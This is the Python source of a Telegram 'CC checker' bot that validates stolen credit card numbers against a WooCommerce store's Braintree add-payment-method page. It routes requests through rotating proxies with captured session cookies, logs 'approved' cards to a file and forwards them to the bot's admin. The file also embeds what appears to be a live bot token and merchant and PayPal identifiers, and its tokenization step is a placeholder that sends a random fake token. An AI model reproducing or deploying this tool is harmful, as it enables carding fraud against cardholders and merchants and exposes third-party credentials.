import telebot
import re
import threading
import time
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import requests
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import random
import urllib3
import sys
import io
import codecs
import os
import glob

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# BOT Configuration
BOT_TOKEN = '8464949673:AAFFxUaGy7E6U1_jwfZsNTkkCkS3-MARCAY'  # Yahan apna real token daal, motherfucker
ADMIN_ID = 6649267931  # Apna Telegram ID daal

bot = telebot.TeleBot(BOT_TOKEN)

AUTHORIZED_USERS = {}

# p.py Integration: Global vars and functions
SELECTED_COOKIE_PAIR = None

def discover_cookie_pairs():
    try:
        pattern1 = 'cookies_*-1.txt'
        pattern2 = 'cookies_*-2.txt'
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        pairs = []
        for file1 in files1:
            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = f'cookies_{pair_id}-2.txt'
            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def select_random_cookie_pair():
    global SELECTED_COOKIE_PAIR
    pairs = discover_cookie_pairs()
    if not pairs:
        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1-1.txt', 'file2': 'cookies_1-2.txt', 'id': '1'}
        return SELECTED_COOKIE_PAIR
    selected_pair = random.choice(pairs)
    SELECTED_COOKIE_PAIR = selected_pair
    return selected_pair

def read_cookies_from_file(filename):
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

def get_domain_url():
    try:
        with open('site.txt', 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"Error reading site.txt: {str(e)}")
        return "https://altairtech.io"

def get_cookies_1():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_random_cookie_pair()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])

def get_cookies_2():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_random_cookie_pair()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])

def get_headers():
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy():
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def get_bin_info(bin_num):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}")
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'Unknown'),
                'type': data.get('type', 'Credit'),
                'level': data.get('brand', 'Standard'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🇺🇸'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    return {'brand': 'Unknown', 'type': 'Credit', 'level': 'Standard', 'country': 'US', 'emoji': '🇺🇸', 'bank': 'Unknown Bank'}

def check_status(error_message):
    if 'successfully' in error_message.lower() or 'added' in error_message.lower():
        return "✅ [APPROVED]", "Payment method added successfully", True
    elif 'declined' in error_message.lower() or 'invalid' in error_message.lower() or 'error' in error_message.lower():
        return "❌ [DECLINED]", error_message, False
    else:
        return "⚠️ [ERROR]", error_message, False

def check_card(cc_line):
    start_time = time.time()
    domain_url = get_domain_url()
    parts = re.split(r'[\|:/ -]', cc_line)
    numbers = [p for p in parts if p.isdigit()]
    if len(numbers) < 4:
        return "Invalid card format, bhai."
    
    n = numbers[0].zfill(16)[:16]
    mm = numbers[1].zfill(2)
    yy = numbers[2].zfill(2)
    if int(yy) < 25:
        yy = '20' + yy
    cvc = numbers[3][:4]
    bin3 = n[:6]
    
    select_random_cookie_pair()
    cookies_1 = get_cookies_1()
    cookies_2 = get_cookies_2()
    headers = get_headers()
    proxy = get_random_proxy()
    
    # Step 1: Get add-payment page for nonce
    response1 = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response1.status_code != 200:
        elapsed = time.time() - start_time
        return f"Failed to load page: {response1.status_code} (Time: {elapsed:.1f}s)"
    
    soup1 = BeautifulSoup(response1.text, 'html.parser')
    add_nonce = soup1.find('input', {'name': 'woocommerce-add-payment-method-nonce'})['value'] if soup1.find('input', {'name': 'woocommerce-add-payment-method-nonce'}) else ''
    
    # Step 2: Simulate tokenization (in real, use Braintree client JS, here dummy post for nonce)
    # For integration, assuming token from config in p.py
    token = f"token_{random.randint(100000,999999)}"  # Replace with actual if have Braintree SDK
    
    # Step 3: Post to add payment method
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
        'woocommerce-add-payment-method-nonce': add_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    response2 = requests.post(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_2,
        headers=headers,
        data=data,
        proxies=proxy,
        verify=False
    )
    
    end_time = time.time()
    elapsed_time = end_time - start_time
    bin_info = get_bin_info(bin3)
    
    if response2.status_code == 200:
        soup2 = BeautifulSoup(response2.text, 'html.parser')
        error_div = soup2.find('div', class_='woocommerce-notices-wrapper')
        if error_div:
            error_message = error_div.get_text(strip=True)
            if error_message:
                status, message, is_approved = check_status(error_message)
                
                if is_approved:
                    with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                        approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {message}
Gateway: Braintree Auth
Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
Country: {bin_info['country']} {bin_info['emoji']}
Issuer: {bin_info['bank']}
Bin: {bin3}
Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
Time: {elapsed_time:.1f}s
Bot By: @Mod_By_Kamal
=========================\n\n""")
                
                response = f"""
=========================
{status}

Card: {n}|{mm}|{yy}|{cvc}
Response: {message}
Gateway: Braintree Auth
Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
Country: {bin_info['country']} {bin_info['emoji']}
Issuer: {bin_info['bank']}
Bin: {bin3}
Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
Time: {elapsed_time:.1f}s
Bot By: @Mod_By_Kamal
=========================
"""
                return response
        return f"No response message (Time: {elapsed_time:.1f}s)"
    else:
        return f"HTTP {response2.status_code} error (Time: {elapsed_time:.1f}s)"

# Bot Helper Functions (from bot.py)
def load_auth():
    try:
        with open("authorized.json", "r") as f:
            return json.load(f)
    except:
        return {}

def save_auth(data):
    with open("authorized.json", "w") as f:
        json.dump(data, f)

def is_authorized(chat_id):
    if chat_id == ADMIN_ID:
        return True
    if str(chat_id) in AUTHORIZED_USERS:
        expiry = AUTHORIZED_USERS[str(chat_id)]
        if expiry == "forever":
            return True
        if time.time() < expiry:
            return True
        else:
            del AUTHORIZED_USERS[str(chat_id)]
            save_auth(AUTHORIZED_USERS)
    return False

def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

AUTHORIZED_USERS = load_auth()

# Bot Commands (from bot.py)
@bot.message_handler(commands=['start'])
def start_handler(msg):
    bot.reply_to(msg, """✦━━━[ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴄ ᴄʜᴇᴄᴋᴇʀ ʙᴏᴛ ]━━━✦

⟡ ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ
⟡ ᴜꜱᴇ /b3 ᴛᴏ ᴄʜᴇᴄᴋ ꜱɪɴɢʟᴇ ᴄᴀʀᴅ
⟡ ꜰᴏʀ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ, ʀᴇᴘʟʏ ᴄᴄ ꜰɪʟᴇ ᴡɪᴛʜ /mb3

ʙᴏᴛ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @Mod_By_Kamal""")

@bot.message_handler(commands=['auth'])
def authorize_user(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, "❌ Usage: /auth <user_id> [days]")
        user = parts[1]
        days = int(parts[2]) if len(parts) > 2 else None

        if user.startswith('@'):
            return bot.reply_to(msg, "❌ Use numeric Telegram ID, not @username.")

        uid = int(user)
        expiry = "forever" if not days else time.time() + (days * 86400)
        AUTHORIZED_USERS[str(uid)] = expiry
        save_auth(AUTHORIZED_USERS)

        bot.reply_to(msg, f"✅ User {uid} authorized for {days if days else 'forever'} days.")
    except:
        bot.reply_to(msg, "❌ Invalid input.")

@bot.message_handler(commands=['b3'])
def single_check(msg):
    if not is_authorized(msg.from_user.id):
        bot.reply_to(msg, "❌ Unauthorized, contact admin.")
        return
    
    if msg.reply_to_message and msg.reply_to_message.text:
        cc_line = normalize_card(msg.reply_to_message.text)
        if not cc_line:
            bot.reply_to(msg, "❌ Invalid card format.")
            return
    else:
        bot.reply_to(msg, "❌ Reply to a message with card details.")
        return
    
    result = check_card(cc_line)
    bot.reply_to(msg, result, parse_mode='Markdown')

@bot.message_handler(commands=['mb3'])
def mass_check(msg):
    if not is_authorized(msg.from_user.id):
        bot.reply_to(msg, "❌ Unauthorized.")
        return
    
    if not msg.reply_to_message or not msg.reply_to_message.document:
        bot.reply_to(msg, "❌ Reply to a .txt file with cards.")
        return
    
    reply = msg.reply_to_message
    if not reply.document.file_name.endswith('.txt'):
        bot.reply_to(msg, "❌ Upload a .txt file.")
        return
    
    try:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('temp_cards.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('temp_cards.txt', 'r') as f:
            content = f.read()
        
        os.remove('temp_cards.txt')
        
        # Extract CC lines
        cc_lines = []
        lines = content.split('\n')
        for line in lines:
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)
        
        if not cc_lines:
            bot.reply_to(msg, "❌ No valid cards found.")
            return
        
        if len(cc_lines) > 15:
            bot.reply_to(msg, "❌ Limit 15 cards, use file for more.")
            return
        
        total = len(cc_lines)
        user_id = msg.from_user.id
        
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton(f"Approved 0 ✅", callback_data="none"),
            InlineKeyboardButton(f"Declined 0 ❌", callback_data="none"),
            InlineKeyboardButton(f"Total Checked 0", callback_data="none"),
            InlineKeyboardButton(f"Total {total}", callback_data="none")
        )
        
        status_msg = bot.send_message(user_id, f"Processing {total} cards...", reply_markup=kb)
        
        approved, declined, checked = 0, 0, 0
        
        def process_all():
            nonlocal approved, declined, checked
            for cc in cc_lines:
                try:
                    checked += 1
                    result = check_card(cc.strip())
                    if "[APPROVED]" in result:
                        approved += 1
                        bot.send_message(user_id, result, parse_mode='Markdown')
                        if ADMIN_ID != user_id:
                            bot.send_message(ADMIN_ID, f"Approved: {result}", parse_mode='Markdown')
                    else:
                        declined += 1
                    
                    new_kb = InlineKeyboardMarkup(row_width=1)
                    new_kb.add(
                        InlineKeyboardButton(f"Approved {approved} ✅", callback_data="none"),
                        InlineKeyboardButton(f"Declined {declined} ❌", callback_data="none"),
                        InlineKeyboardButton(f"Total Checked {checked}", callback_data="none"),
                        InlineKeyboardButton(f"Total {total}", callback_data="none")
                    )
                    bot.edit_message_reply_markup(user_id, status_msg.message_id, reply_markup=new_kb)
                    time.sleep(2)
                except Exception as e:
                    bot.send_message(user_id, f"Error: {e}")
            
            bot.send_message(user_id, "Checking completed! Only approved shown.")
        
        threading.Thread(target=process_all).start()
        
    except Exception as e:
        bot.reply_to(msg, f"Error: {e}")

# Start Bot
if __name__ == "__main__":
    print("Bot starting...")
    bot.infinity_polling()
